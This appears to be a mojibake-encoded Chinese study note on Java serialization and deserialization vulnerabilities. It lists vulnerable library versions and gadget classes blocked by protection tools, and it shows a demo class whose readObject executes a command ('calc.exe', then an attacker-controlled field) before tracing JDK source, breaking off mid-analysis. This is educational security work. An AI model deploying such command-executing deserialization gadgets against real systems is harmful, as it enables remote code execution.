org.apache.commons:commons-collections 4.0 com.mchange:c3p0 0.9.5.2 org.beanshell:bsh 2.0b5 org.codehaus.groovy:groovy 2.3.9 org.springframework:spring-aop 4.1.4.RELEASE æŸååºåˆ—åŒ–é˜²æŠ¤è½¯ä»¶ä¾¿æ˜¯é€šè¿‡ç¦ç”¨ä»¥ä¸‹ç±»çš„ååºåˆ—åŒ–æ¥ä¿æŠ¤ç¨‹åºï¼š\n1 2 3 4 5 6 7 8 \u0026#39;org.apache.commons.collections.functors.InvokerTransformer\u0026#39;, \u0026#39;org.apache.commons.collections.functors.InstantiateTransformer\u0026#39;, \u0026#39;org.apache.commons.collections4.functors.InvokerTransformer\u0026#39;, \u0026#39;org.apache.commons.collections4.functors.InstantiateTransformer\u0026#39;, \u0026#39;org.codehaus.groovy.runtime.ConvertedClosure\u0026#39;, \u0026#39;org.codehaus.groovy.runtime.MethodClosure\u0026#39;, \u0026#39;org.springframework.beans.factory.ObjectFactory\u0026#39;, \u0026#39;xalan.internal.xsltc.trax.TemplatesImpl\u0026#39; â€‹\tåŸºç¡€åº“ä¸­çš„è°ƒç”¨æµç¨‹ä¸€èˆ¬éƒ½æ¯”è¾ƒå¤æ‚ï¼Œä¸ä¼šå¦‚åŒæ¥ä¸‹æ¥ç»™å‡ºçš„æµ‹è¯•ç”¨ä¾‹ä¸€èˆ¬ç®€å•ï¼Œæ¶‰åŠåˆ°POPé“¾ï¼Œåå°„ï¼Œæ³›å‹ç­‰çŸ¥è¯†\nå¦‚ä½•åºåˆ—åŒ–ä¸ååºåˆ—åŒ– JDKç±»åº“æä¾›çš„åºåˆ—åŒ–API java.io.ObjectOutputStreamï¼šè¡¨ç¤ºå¯¹è±¡è¾“å‡ºæµ å®ƒçš„writeObject(Object obj)æ–¹æ³•å¯ä»¥å¯¹å‚æ•°æŒ‡å®šçš„objå¯¹è±¡è¿›è¡Œåºåˆ—åŒ–ï¼ŒæŠŠå¾—åˆ°çš„å­—èŠ‚åºåˆ—å†™åˆ°ä¸€ä¸ªç›®æ ‡è¾“å‡ºæµä¸­ã€‚ java.io.ObjectInputStreamï¼šè¡¨ç¤ºå¯¹è±¡è¾“å…¥æµ å®ƒçš„readObject()æ–¹æ³•ä»æºè¾“å…¥æµä¸­è¯»å–å­—èŠ‚åºåˆ—ï¼Œå†æŠŠå®ƒä»¬ååºåˆ—åŒ–æˆä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶å°†å…¶è¿”å›ã€‚ Javaå¯¹è±¡åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„è°ƒç”¨æµç¨‹ æ–¹æ³•ä¸€ï¼š\nè‹¥Studentç±»ä»…ä»…å®ç°äº†Serializableæ¥å£ï¼Œåˆ™å¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ–¹å¼è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚ ObjectOutputStreamé‡‡ç”¨é»˜è®¤çš„åºåˆ—åŒ–æ–¹å¼ï¼Œå¯¹Studentå¯¹è±¡çš„étransientçš„å®ä¾‹å˜é‡è¿›è¡Œåºåˆ—åŒ–ã€‚ ObjcetInputStreamé‡‡ç”¨é»˜è®¤çš„ååºåˆ—åŒ–æ–¹å¼ï¼Œå¯¹å¯¹Studentå¯¹è±¡çš„étransientçš„å®ä¾‹å˜é‡è¿›è¡Œååºåˆ—åŒ–ã€‚\næ–¹æ³•äºŒï¼š\nè‹¥Studentç±»ä»…ä»…å®ç°äº†Serializableæ¥å£ï¼Œå¹¶ä¸”è¿˜å®šä¹‰äº†readObject(ObjectInputStream in)å’ŒwriteObject(ObjectOutputSteam out)ï¼Œ ObjectOutputStreamè°ƒç”¨Studentå¯¹è±¡çš„writeObject(ObjectOutputStream out)çš„æ–¹æ³•è¿›è¡Œåºåˆ—åŒ–ã€‚ ObjectInputStreamä¼šè°ƒç”¨Studentå¯¹è±¡çš„readObject(ObjectInputStream in)çš„æ–¹æ³•è¿›è¡Œååºåˆ—åŒ–ã€‚\næ–¹æ³•ä¸‰ï¼š\nè‹¥Studentç±»å®ç°äº†Externalnalizableæ¥å£ï¼Œä¸”Studentç±»å¿…é¡»å®ç°readExternal(ObjectInput in)å’ŒwriteExternal(ObjectOutput out)æ–¹æ³•ï¼Œåˆ™æŒ‰ç…§ä»¥ä¸‹æ–¹å¼è¿›è¡Œåºåˆ—åŒ–ä¸ååºåˆ—åŒ–ã€‚ ObjectOutputStreamè°ƒç”¨Studentå¯¹è±¡çš„writeExternal(ObjectOutput out))çš„æ–¹æ³•è¿›è¡Œåºåˆ—åŒ–ã€‚ ObjectInputStreamä¼šè°ƒç”¨Studentå¯¹è±¡çš„readExternal(ObjectInput in)çš„æ–¹æ³•è¿›è¡Œååºåˆ—åŒ–ã€‚\nå°è¯•åºåˆ—åŒ– å…ˆå†™ä¸€ä¸ªå¾…ååºåˆ—åŒ–çš„ç±»ï¼š\n1 2 3 4 5 6 7 8 9 public class Employee implements java.io.Serializable { public String name; public String identify; public void mailCheck() { System.out.println(\u0026#34;This is the \u0026#34;+this.identify+\u0026#34; of our company\u0026#34;); } } ç„¶åå†å†™ä¸€ä¸ªåºåˆ—åŒ–å’Œååºåˆ—åŒ–æµ‹è¯•ç±»ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 import java.io.FileOutputStream; import java.io.IOException; import java.io.ObjectOutputStream; public class SerializeDemo { public static void main(String [] args) { Employee e = new Employee(); e.name = \u0026#34;my name\u0026#34;; e.identify = \u0026#34;General staff\u0026#34;; try { // æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶è¾“å…¥æµ FileOutputStream fileOut = new FileOutputStream(\u0026#34;C:\\\\Users\\\\DAN\\\\Desktop\\\\Serialize.txt\u0026#34;); // å»ºç«‹å¯¹è±¡è¾“å…¥æµ ObjectOutputStream out = new ObjectOutputStream(fileOut); //è¾“å‡ºååºåˆ—åŒ–å¯¹è±¡ out.writeObject(e); out.close(); fileOut.close(); System.out.printf(\u0026#34;Serialized data is saved in C:\\\\Users\\\\DAN\\\\Desktop\\\\Serialize.txt\u0026#34;); }catch(IOException i) { i.printStackTrace(); } } } è¿è¡Œåï¼ŒEmployeeå¯¹è±¡çš„åºåˆ—åŒ–æ•°æ®å°±å­˜å‚¨åˆ°äº†Serialize.txtä¸­ï¼Œæˆ‘ä»¬æ‰“å¼€çœ‹ä¸€ä¸‹ï¼ˆä½¿ç”¨äºŒè¿›åˆ¶æŸ¥çœ‹å™¨ï¼‰\nå¯ä»¥ä¾ç¨€çœ‹è§ï¼šç±»åï¼Œå±æ€§åç§°ï¼Œå±æ€§ç±»å‹ï¼Œä»¥åŠå±æ€§å¯¹åº”çš„å€¼ å€¼å¾—æ³¨æ„çš„æ˜¯ï¼šå¤§éƒ¨åˆ†çš„ååºåˆ—åŒ–æ•°æ®å‡æ˜¯ä»¥AC ED 00 05 å¼€å¤´çš„\nååºåˆ—åŒ–æ“ä½œå°±æ˜¯ä»å­—èŠ‚æµä¸­æå–å¯¹è±¡ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 import java.io.*; public class SerializeDemo2 { public static void main(String [] args) { Employee e = null; try { // æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶è¾“å…¥æµ FileInputStream fileIn = new FileInputStream(\u0026#34;C:\\\\Users\\\\DAN\\\\Desktop\\\\Serialize.txt\u0026#34;); // å»ºç«‹å¯¹è±¡è¾“å…¥æµ ObjectInputStream in = new ObjectInputStream(fileIn); // è¯»å–å¯¹è±¡ e = (Employee) in.readObject(); in.close(); fileIn.close(); }catch(IOException i) { i.printStackTrace(); return; }catch(ClassNotFoundException c) { System.out.println(\u0026#34;Employee class not found\u0026#34;); c.printStackTrace(); return; } System.out.println(\u0026#34;Deserialized Employee...\u0026#34;); System.out.println(\u0026#34;Name: \u0026#34; + e.name); System.out.println(\u0026#34;This is the \u0026#34;+e.identify+\u0026#34; of our company\u0026#34;); } } è¿è¡Œåå¯ä»¥å‘ç°Employeeçš„æ•°æ®å·²ç»è·å–åˆ°äº†ç›®æ ‡ç¨‹åºä¸­å¯¹è±¡eé‡Œ\nä¸Šè¯‰å°±æ˜¯ä¸€ä¸ªå®Œæ•´çš„åºåˆ—åŒ–å‘¨æœŸï¼Œä¸­é—´ä½¿ç”¨æ–‡ä»¶æš‚æ—¶ä½œä¸ºäº†ä¼ è¾“ä»‹è´¨ï¼Œå…¶å®å®é™…åº”ç”¨ä¸­çš„åºåˆ—åŒ–æ— éå°±æ˜¯ä¼ è¾“çš„æ–¹å¼å’Œä¼ è¾“æœºåˆ¶ç¨å¾®å¤æ‚ä¸€ç‚¹\næ€»ç»“åºåˆ—åŒ–å…·ä½“æ­¥éª¤ ä»ä¸Šé¢çš„å¯ä»¥çœ‹å‡ºå¯¹è±¡çš„åºåˆ—åŒ–æ­¥éª¤æ˜¯ï¼š\nåˆ›å»ºä¸€ä¸ªå¯¹è±¡è¾“å‡ºæµï¼Œå®ƒå¯ä»¥åŒ…è£…ä¸€ä¸ªå…¶å®ƒç±»å‹çš„ç›®æ ‡è¾“å‡ºæµï¼Œå¦‚æ–‡ä»¶è¾“å‡ºæµï¼š ObjectOutputStream out = new ObjectOutputStream(new fileOutputStream(â€œD:\\\\objectfile.objâ€));\né€šè¿‡å¯¹è±¡è¾“å‡ºæµçš„writeObject()æ–¹æ³•å†™å¯¹è±¡ï¼š\n1 2 out.writeObject(â€œHelloâ€); out.writeObject(new Date()); å¯¹è±¡çš„ååºåˆ—åŒ–æ­¥éª¤æ˜¯ï¼š\nåˆ›å»ºä¸€ä¸ªå¯¹è±¡è¾“å…¥æµï¼Œå®ƒå¯ä»¥åŒ…è£…ä¸€ä¸ªå…¶å®ƒç±»å‹è¾“å…¥æµï¼Œå¦‚æ–‡ä»¶è¾“å…¥æµï¼š ObjectInputStream in = new ObjectInputStream(new fileInputStream(â€œD:\\\\objectfile.objâ€));\né€šè¿‡å¯¹è±¡è¾“å‡ºæµçš„writeObject()æ–¹æ³•å†™å¯¹è±¡ï¼š\n1 2 String obj1 = (String)in.readObject(); Date obj2 = (Date)in.readObject(); åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„å¿…è¦æ¡ä»¶ å¿…é¡»æ˜¯åŒåŒ…ï¼ŒåŒåã€‚ serialVersionUIDå¿…é¡»ä¸€è‡´ã€‚æœ‰æ—¶å€™ä¸¤ä¸ªç±»çš„å±æ€§ç¨å¾®ä¸ä¸€è‡´çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡å°†æ­¤å±æ€§å†™æ­»å€¼ï¼Œå®ç°åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚ åºåˆ—åŒ–ä¸­æ¶‰åŠç»†èŠ‚ serialVersionUID ç‰ˆæœ¬æ§åˆ¶ â€‹\tJavaçš„åºåˆ—åŒ–æœºåˆ¶æ˜¯é€šè¿‡åœ¨è¿è¡Œæ—¶åˆ¤æ–­ç±»çš„ serialVersionUID æ¥éªŒè¯ç‰ˆæœ¬ä¸€è‡´æ€§çš„ã€‚åœ¨è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼ŒJVMä¼šæŠŠä¼ æ¥çš„å­—èŠ‚æµä¸­çš„serialVersionUIDä¸æœ¬åœ°ç›¸åº”å®ä½“ï¼ˆç±»ï¼‰çš„serialVersionUIDè¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœç›¸åŒå°±è®¤ä¸ºæ˜¯ä¸€è‡´çš„ï¼Œå¯ä»¥è¿›è¡Œååºåˆ—åŒ–ï¼Œå¦åˆ™å°±ä¼šå‡ºç°åºåˆ—åŒ–ç‰ˆæœ¬ä¸ä¸€è‡´çš„å¼‚å¸¸ã€‚\nâ€‹\tè™šæ‹Ÿæœºæ˜¯å¦å…è®¸ååºåˆ—åŒ–ï¼Œä¸ä»…å–å†³äºç±»è·¯å¾„å’ŒåŠŸèƒ½ä»£ç æ˜¯å¦ä¸€è‡´ï¼Œä¸€ä¸ªéå¸¸é‡è¦çš„ä¸€ç‚¹æ˜¯ä¸¤ä¸ªç±»çš„åºåˆ—åŒ– ID æ˜¯å¦ä¸€è‡´ï¼Œä»£ç ä¸­è®¾ç½® serialVersionUID å¯ä»¥åœ¨ç±»ä¸­æ·»åŠ  private static final long serialVersionUID = 1L\nâ€‹\tå½“å®ç°java.io.Serializableæ¥å£çš„å®ä½“ï¼ˆç±»ï¼‰æ²¡æœ‰æ˜¾å¼åœ°å®šä¹‰ä¸€ä¸ªåä¸ºserialVersionUIDï¼Œç±»å‹ä¸ºlongçš„å˜é‡æ—¶ï¼ŒJavaåºåˆ—åŒ–æœºåˆ¶ä¼šæ ¹æ®ç¼–è¯‘çš„classè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªserialVersionUIDä½œåºåˆ—åŒ–ç‰ˆæœ¬æ¯”è¾ƒç”¨ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œåªæœ‰åŒä¸€æ¬¡ç¼–è¯‘ç”Ÿæˆçš„classæ‰ä¼šç”Ÿæˆç›¸åŒçš„serialVersionUID\nâ€‹\tå¦‚æœæˆ‘ä»¬ä¸å¸Œæœ›é€šè¿‡ç¼–è¯‘æ¥å¼ºåˆ¶åˆ’åˆ†è½¯ä»¶ç‰ˆæœ¬ï¼Œå³å®ç°åºåˆ—åŒ–æ¥å£çš„å®ä½“èƒ½å¤Ÿå…¼å®¹å…ˆå‰ç‰ˆæœ¬ï¼Œæœªä½œæ›´æ”¹çš„ç±»ï¼Œå°±éœ€è¦æ˜¾å¼åœ°å®šä¹‰ä¸€ä¸ªåä¸ºserialVersionUIDï¼Œç±»å‹ä¸ºlongçš„å˜é‡ï¼Œä¸ä¿®æ”¹è¿™ä¸ªå˜é‡å€¼çš„åºåˆ—åŒ–å®ä½“éƒ½å¯ä»¥ç›¸äº’è¿›è¡Œä¸²è¡ŒåŒ–å’Œåä¸²è¡ŒåŒ–ã€‚\nå¸¸è§åœºæ™¯ é—®é¢˜å‡ºç°åœºæ™¯ï¼šä¸¤ä¸ªå®¢æˆ·ç«¯ A å’Œ B è¯•å›¾é€šè¿‡ç½‘ç»œä¼ é€’å¯¹è±¡æ•°æ®ï¼ŒA ç«¯å°†å¯¹è±¡ C åºåˆ—åŒ–ä¸ºäºŒè¿›åˆ¶æ•°æ®å†ä¼ ç»™ Bï¼ŒB ååºåˆ—åŒ–å¾—åˆ° Cã€‚ é—®é¢˜ï¼šC å¯¹è±¡çš„å…¨ç±»è·¯å¾„å‡è®¾ä¸º com.inout.Testï¼Œåœ¨ A å’Œ B ç«¯éƒ½æœ‰è¿™ä¹ˆä¸€ä¸ªç±»æ–‡ä»¶ï¼ŒåŠŸèƒ½ä»£ç å®Œå…¨ä¸€è‡´ã€‚ä¹Ÿéƒ½å®ç°äº† Serializable æ¥å£ï¼Œä½†æ˜¯ååºåˆ—åŒ–æ—¶æ€»æ˜¯æç¤ºä¸æˆåŠŸã€‚ è§£å†³ï¼šç»Ÿä¸€serialVersionUIDçš„å€¼\nè™½ç„¶ä¸¤ä¸ªç±»çš„åŠŸèƒ½ä»£ç å®Œå…¨ä¸€è‡´ï¼Œä½†æ˜¯åºåˆ—åŒ– ID ä¸åŒï¼Œä»–ä»¬æ— æ³•ç›¸äº’åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚\nserialVersionUID ä½¿ç”¨åœºæ™¯ åºåˆ—åŒ–å­˜å‚¨è§„åˆ™ å°†åŒä¸€å¯¹è±¡åºåˆ—åŒ–å¹¶ä¸¤æ¬¡å†™å…¥åŒä¸€æ–‡ä»¶æ—¶ Java åºåˆ—åŒ–æœºåˆ¶ä¸ºäº†èŠ‚çœç£ç›˜ç©ºé—´ï¼Œå…·æœ‰ç‰¹å®šçš„å­˜å‚¨è§„åˆ™ï¼Œå½“å†™å…¥æ–‡ä»¶çš„ä¸ºåŒä¸€å¯¹è±¡æ—¶ï¼Œå¹¶ä¸ä¼šå†å°†å¯¹è±¡çš„å†…å®¹è¿›è¡Œå­˜å‚¨ï¼Œè€Œåªæ˜¯å†æ¬¡å­˜å‚¨ä¸€ä»½å¼•ç”¨ï¼Œæ–‡ä»¶åªä¼šå¢åŠ å°å°çš„å‡ ä¸ªå­—èŠ‚ï¼Œè¿™å‡ ä¸ªå­—èŠ‚çš„å­˜å‚¨ç©ºé—´å°±æ˜¯æ–°å¢å¼•ç”¨å’Œä¸€äº›æ§åˆ¶ä¿¡æ¯çš„ç©ºé—´ã€‚ååºåˆ—åŒ–æ—¶ï¼Œæ¢å¤å¼•ç”¨å…³ç³»ï¼Œä½¿å¾—ååºåˆ—åŒ–çš„ e1 å’Œ e2 æŒ‡å‘å”¯ä¸€çš„å¯¹è±¡ï¼ŒäºŒè€…ç›¸ç­‰ï¼Œä¸ºå¼•ç”¨å…³ç³»ï¼Œè¯¥å­˜å‚¨è§„åˆ™æå¤§çš„èŠ‚çœäº†å­˜å‚¨ç©ºé—´ã€‚\nå°†å¯¹è±¡åºåˆ—åŒ–åå†™å…¥æ–‡ä»¶ï¼Œä¿®æ”¹å¯¹è±¡å‚æ•°å€¼åå†æ¬¡åºåˆ—åŒ–åå†™å…¥åŒä¸€æ–‡ä»¶æ—¶ ç¬¬ä¸€æ¬¡å†™å…¥å¯¹è±¡ä»¥åï¼Œç¬¬äºŒæ¬¡å†è¯•å›¾å†™çš„æ—¶å€™ï¼Œè™šæ‹Ÿæœºæ ¹æ®å¼•ç”¨å…³ç³»çŸ¥é“å·²ç»æœ‰ä¸€ä¸ªç›¸åŒå¯¹è±¡å·²ç»å†™å…¥æ–‡ä»¶ï¼Œå› æ­¤åªä¿å­˜ç¬¬äºŒæ¬¡å†™çš„å¼•ç”¨ï¼Œæ‰€ä»¥è¯»å–æ—¶ï¼Œéƒ½æ˜¯ç¬¬ä¸€æ¬¡ä¿å­˜çš„å¯¹è±¡ã€‚è¯»è€…åœ¨ä½¿ç”¨ä¸€ä¸ªæ–‡ä»¶å¤šæ¬¡ writeObject éœ€è¦ç‰¹åˆ«æ³¨æ„è¿™ä¸ªé—®é¢˜ã€‚\næ›´å¤šç»†èŠ‚ å…³äº é™æ€å˜é‡åºåˆ—åŒ– ï¼Œçˆ¶ç±»çš„åºåˆ—åŒ–ä¸ Transient å…³é”®å­—ï¼Œå¯¹æ•æ„Ÿå­—æ®µåŠ å¯†ï¼Œç§»æ­¥é“¾æ¥3\nåˆè¯†ååºåˆ—åŒ–æ¼æ´ Javaååºåˆ—åŒ–æ—¶ï¼Œä¼šè°ƒç”¨readObjectæ–¹æ³•å°±è¡Œååºåˆ—åŒ–æ“ä½œï¼Œå½“readObjectæ–¹æ³•ä¹¦å†™ä¸å½“æ—¶å°±ä¼šå¼•å‘æ¼æ´\næœ‰æ—¶ä¹Ÿä¼šä½¿ç”¨readUnshared()æ–¹æ³•æ¥è¯»å–å¯¹è±¡ï¼ŒreadUnshared()ä¸å…è®¸åç»­çš„readObjectå’ŒreadUnsharedè°ƒç”¨å¼•ç”¨è¿™æ¬¡è°ƒç”¨ååºåˆ—åŒ–å¾—åˆ°çš„å¯¹è±¡ï¼Œè€ŒreadObjectè¯»å–çš„å¯¹è±¡å¯ä»¥\nå¤§ä½¬ç»™çš„ä¾‹å­ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 import java.io.*; public class test0{ public static void main(String args[]) throws Exception{ UnsafeClass0 Unsafe = new UnsafeClass0(); Unsafe.name = \u0026#34;hacked by ph0rse\u0026#34;; FileOutputStream fos = new FileOutputStream(\u0026#34;C:\\\\Users\\\\DAN\\\\Desktop\\\\Serialize.txt\u0026#34;); ObjectOutputStream os = new ObjectOutputStream(fos); //writeObject()æ–¹æ³•å°†Unsafeå¯¹è±¡å†™å…¥objectæ–‡ä»¶ os.writeObject(Unsafe); os.close(); //ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–objå¯¹è±¡ FileInputStream fis = new FileInputStream(\u0026#34;C:\\\\Users\\\\DAN\\\\Desktop\\\\Serialize.txt\u0026#34;); ObjectInputStream ois = new ObjectInputStream(fis); //æ¢å¤å¯¹è±¡ UnsafeClass0 objectFromDisk = (UnsafeClass0)ois.readObject(); System.out.println(objectFromDisk.name); ois.close(); } } class UnsafeClass0 implements Serializable{ public String name; //é‡å†™readObject()æ–¹æ³• private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{ //æ‰§è¡Œé»˜è®¤çš„readObject()æ–¹æ³• in.defaultReadObject(); //æ‰§è¡Œå‘½ä»¤ Runtime.getRuntime().exec(\u0026#34;calc.exe\u0026#34;); } } èƒ½å¤ŸæˆåŠŸæ‰§è¡Œåˆ°Runtime.getRuntime().exec(\u0026quot;calc.exe\u0026quot;);\nå¯¹ååºåˆ—åŒ–çš„ç–‘é—®ä¸åˆ†æ å…³äºå¤§ä½¬çš„ä»£ç æˆ‘æœ‰å‡ ä¸ªç–‘é—®ï¼š\nRuntime.getRuntime().exec(\u0026quot;calc.exe\u0026quot;); åªèƒ½å¤Ÿæ§åˆ¶å¼¹å‡ºä¸€ä¸ªè®¡ç®—å™¨ï¼Œæˆ‘èƒ½ä¸èƒ½ä½¿ç”¨ä¸€ä¸ªå­—ç¬¦ä¸²å˜é‡ä»£æ›¿ï¼ˆPHPååºåˆ—åŒ–çš„ç»éªŒå‘Šè¯‰æˆ‘åº”è¯¥æ˜¯å¯è¡Œçš„ï¼‰ï¼Œè¿›è€Œè½»æ¾æ”¹å˜å°†è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Ÿ\nUnsafeClass0 çš„ readObject æ˜¯ä½•æ—¶è¢«æ‰§è¡Œçš„ï¼Œæ˜¯è¢«è°è°ƒç”¨çš„ï¼ˆå› ä¸ºå½“æˆ‘æŸ¥çœ‹ä¸‹å›¾readObjectæ‰§è¡Œæ—¶çš„æºç æ—¶ è·³è½¬çš„æ˜¯ObjectInputStreamç±»çš„readObject é‚£ä¹ˆæ˜¯ä»€ä¹ˆæ—¶å€™è°ƒç”¨çš„UnsafeClass0çš„readObjectå‘¢ï¼Ÿï¼ˆå¼ºè½¬ç±»å‹çš„æ—¶å€™å—ï¼Ÿï¼‰\nç¬¬ä¸€ä¸ªé—®é¢˜ å…³äºç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œåªéœ€è¦å°†æ–­ç‚¹æ‰“åˆ°Runtime.getRuntime().exec(\u0026quot;calc.exe\u0026quot;);ï¼Œç„¶åè§‚å¯Ÿå˜é‡å°±ä¸éš¾çœ‹å‡ºå¯ä»¥ä½¿ç”¨this.commandæ‰“åˆ°æˆ‘æƒ³è¦çš„æ•ˆæœï¼Œæ‰€ä»¥ä¿®æ”¹ä»£ç ä¸º\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import java.io.*; public class test0{ public static void main(String args[]) throws Exception{ ---- Unsafe.name = \u0026#34;hacked by D4n\u0026#34;; Unsafe.command = \u0026#34;notepad\u0026#34;;//å¢åŠ  ---- } } class UnsafeClass0 implements Serializable{ --- public String command; //å¢åŠ  //é‡å†™readObject()æ–¹æ³• private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{ --- Runtime.getRuntime().exec(this.command); //ä¿®æ”¹ } } æ­¤æ—¶åªéœ€è¦æ§åˆ¶ Unsafe å¯¹è±¡çš„ command å±æ€§å€¼å³å¯æ‰§è¡Œä¸åŒå‘½ä»¤\nä½†æ˜¯åœ¨åˆ†æç¬¬ä¸€ä¸ªé—®é¢˜çš„æ—¶å€™ï¼Œåˆšè¿›å…¥ UnsafeClass0çš„readObject()æ–¹æ³•çš„æ—¶å€™ï¼Œthisè¿˜æ²¡æœ‰è¢«èµ‹å€¼\nå†æ­¥è¿‡in.defaultReadObject();çš„æ—¶å€™ï¼Œthis çš„å˜é‡å€¼å°±è¢«èµ‹å€¼æˆäº†æˆ‘ä»¬è®¾ç½®çš„æ ·å­ï¼š æ‰€ä»¥æˆ‘æƒ³è·Ÿè¿›ä¸€ä¸‹ï¼Œå…³äºthiså˜é‡æ˜¯ä»€ä¹ˆæ—¶å€™æ€ä¹ˆæ ·è¢«èµ‹å€¼çš„ï¼Œæ‰€ä»¥åº”è¯¥ç€é‡åˆ†æin.defaultReadObject();å¹²äº†å“ªäº›äº‹ï¼Œå¹¶ä¸”åœ¨æ­¤ä¹‹å‰ï¼Œå…¶ä»–ç›¸å…³ååºåˆ—åŒ–ä»£ç åšçš„äº‹åªæ˜¯åˆ›å»ºå¥½å¯¹è±¡ï¼Œå¼€è¾Ÿå¥½ç©ºé—´ï¼Œæ²¡æœ‰èµ‹å€¼æ“ä½œï¼ˆçŒœæµ‹ï¼‰\næ–°é—®é¢˜ï¼šå…³äºthiså˜é‡æ˜¯ä»€ä¹ˆæ—¶å€™æ€ä¹ˆæ ·è¢«èµ‹å€¼çš„ï¼ˆåºåˆ—åŒ–å­—ç¬¦ä¸²æ˜¯æ€ä¹ˆä¸€æ­¥ä¸€æ­¥å˜æˆå¯¹è±¡çš„ï¼‰\nè®©æˆ‘ä»¬è¿›å…¥in.defaultReadObject();çœ‹çœ‹ æ²¡æ³•ç›´æ¥æ­¥å…¥ï¼Œæ‰€ä»¥è¦å…ˆ ctrl + B è¿›å…¥æºç åå†æ‰“æ–­ç‚¹ è´´ä¸ªæºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 public void defaultReadObject() throws IOException, ClassNotFoundException { SerialCallbackContext ctx = curContext; if (ctx == null) { throw new NotActiveException(\u0026#34;not in call to readObject\u0026#34;); } Object curObj = ctx.getObj(); ObjectStreamClass curDesc = ctx.getDesc(); bin.setBlockDataMode(false); // Read fields of the current descriptor into a new FieldValues FieldValues values = new FieldValues(curDesc, true); if (curObj != null) { values.defaultCheckFieldValues(curObj); values.defaultSetFieldValues(curObj); } bin.setBlockDataMode(true); if (!curDesc.hasWriteObjectData()) { /* * Fix for 4360508: since stream does not contain terminating * TC_ENDBLOCKDATA tag, set flag so that reading code elsewhere * knows to simulate end-of-custom-data behavior. */ defaultDataEnd = true; } ClassNotFoundException ex = handles.lookupException(passHandle); if (ex != null) { throw ex; } } å…¶ä¸­ç¬¬ä¸€å¥èµ‹å€¼å®Œæˆåå°±å¯ä»¥çœ‹åˆ° ctxä¸­å·²ç»å­˜æ”¾å¥½äº† UnsafeClass0 ç±»çš„æœªåˆå§‹åŒ–å¯¹è±¡ï¼ˆå®é™…ä»åœ°å€æ¥çœ‹å°±æ˜¯åœ¨in.defaultReadObject();è°ƒç”¨æ—¶çš„\u0026quot;thiså˜é‡\u0026quot;ï¼Œä¸ºäº†æ–¹ä¾¿ç§°å‘¼ï¼Œæˆ‘ç§°ä¹‹ä¸ºUnsafeClass0--this\nSerialCallbackContextç±»ç†è§£\nä¹‹å\nObject curObj = ctx.getObj();å°†thisåœ°å€å€¼èµ‹å€¼ç»™ curObjï¼Œå³ curObj æ˜¯UnsafeClass0--thisçš„å¼•ç”¨\nObjectStreamClass curDesc = ctx.getDesc();å°†å¯¹è±¡æµèµ‹å€¼ç»™ curDesc æŸ¥çœ‹ curDesc å‘ç°\nçŒœæµ‹è¿™é‡Œå­˜æ”¾çš„æ˜¯å¯¹è±¡å±æ€§ä»¥åŠå¯¹åº”å€¼ï¼Œç²—ç•¥æŸ¥çœ‹æ²¡æœ‰æ‰¾åˆ°å…·ä½“æ•°æ®ï¼Œè¿‡\nbin.setBlockDataMode(false); BlockDataInputStream è¿™å¥çš„ç²—ç•¥ç†è§£å°±æ˜¯ä¸€ä¸ªæµç¨‹æ§åˆ¶ï¼Œæš‚æ—¶æ— å…³æˆ‘éœ€è¦åˆ†æçš„é—®é¢˜ï¼Œè¿‡ é—®é¢˜1-2ï¼šå…³äºthiså˜é‡æ˜¯ä»€ä¹ˆæ—¶å€™æ€ä¹ˆæ ·è¢«èµ‹å€¼çš„\nFieldValues values = new FieldValues(curDesc, true); è¿™å¥æ‰§è¡Œä¹‹å curObjæš‚æ—¶æ²¡æœ‰å‘ç”Ÿå˜åŒ–\næ‰€ä»¥å…ˆä¸å»æŸ¥çœ‹FieldValuesåœ¨åšä»€ä¹ˆäº‹æƒ…ï¼Œæ ¹æ®æ„é€ çš„ä¼ å‚çŒœæµ‹å¤§è‡´æ˜¯å¯¹ ç±»æè¿°è¿›è¡Œå¤„ç†\næ¥ä¸‹æ¥è¿›å…¥ ifåˆ¤æ–­\nï¼ˆ curObj ä¸ä¸ºç©º ï¼‰\næ‰§è¡Œå®Œvalues.defaultSetFieldValues(curObj);ä¹‹åï¼ŒcurObjçš„å€¼å°±è¢«è®¾ç½®å¥½äº†ï¼Œæœç„¶ä½¿ç”¨åˆ°äº† FieldValuesç±»çš„å¯¹è±¡valuesï¼Œè·Ÿè¿›ä¸€ä¸‹values.defaultSetFieldValues(curObj);\ndefaultSetFieldValues()ç¬¬ä¸€ä¸ªIFåˆ¤æ–­falseï¼Œç¬¬äºŒä¸ªåˆ¤æ–­Tureï¼Œå°†è¦ä¿®æ”¹çš„å¯¹è±¡Obj ä¼ å…¥desc.setObjFieldValues(obj, 